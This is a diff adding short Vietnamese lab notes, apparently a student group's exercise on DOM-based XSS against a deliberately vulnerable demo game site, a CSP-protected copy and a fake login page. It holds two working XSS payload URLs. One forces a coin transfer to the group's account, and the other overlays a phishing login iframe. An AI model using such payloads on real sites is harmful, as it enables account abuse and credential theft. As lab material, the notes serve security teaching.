@@ -1,0 +1,16 @@
+source trang web game: https://github.com/ZeroDayArcade/HTML5_DOM-Based-XSS
+
+web có lỗ hổng
+https://gameweb213.vercel.app/
+
+web có csp
+https://gameapp213csp.vercel.app/
+
+web đăng nhập giả mạo
+https://giamaologin.vercel.app/
+
+Thay đổi main.js để gửi coin cho người chơi tên 'Nhom7'
+https://gameweb213.vercel.app/?search=<svg onload="{document.getElementById('send_to_user').value='Nhom7';document.getElementById('num_coins').value=100;sendCoins();}"></svg>
+
+Chèn một iframe thay thế để giả mạo chức năng đăng nhập 
+https://gameweb213.vercel.app/?search=<img src="x" onerror="var iframe=document.createElement('iframe');iframe.src='https://giamaologin.vercel.app/';iframe.width='100%';iframe.height='500px';iframe.style.border='none';var targetElement=document.getElementById('search_results');targetElement.innerHTML='';targetElement.appendChild(iframe);" alt="Image">
